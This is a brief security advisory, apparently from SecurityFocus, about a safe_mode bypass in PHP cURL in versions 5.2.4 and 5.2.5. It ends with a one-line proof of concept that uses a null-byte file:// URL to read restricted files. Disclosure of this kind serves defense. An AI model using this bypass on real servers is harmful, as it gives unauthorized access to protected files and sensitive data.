source: http://www.securityfocus.com/bid/27413/info

PHP cURL is prone to a 'safe mode' security-bypass vulnerability.

Attackers can use this issue to gain access to restricted files, potentially obtaining sensitive information that may aid in further attacks.

The issue affects PHP 5.2.5 and 5.2.4. 

var_dump(curl_exec(curl_init("file://safe_mode_bypass\x00&quot;.__FILE__))); 